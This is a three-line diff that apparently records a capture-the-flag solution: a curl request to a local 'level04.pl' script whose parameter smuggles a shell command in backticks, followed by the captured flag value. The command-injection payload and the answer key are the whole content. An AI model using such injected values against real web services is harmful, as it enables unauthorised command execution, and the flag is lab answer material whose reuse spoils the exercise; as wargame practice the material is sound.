@@ -1,0 +1,3 @@
+curl localhost:4747/level04.pl?x='`getflag`'
+
+flag04 = ne2searoevaevoem4ov4ar8ap
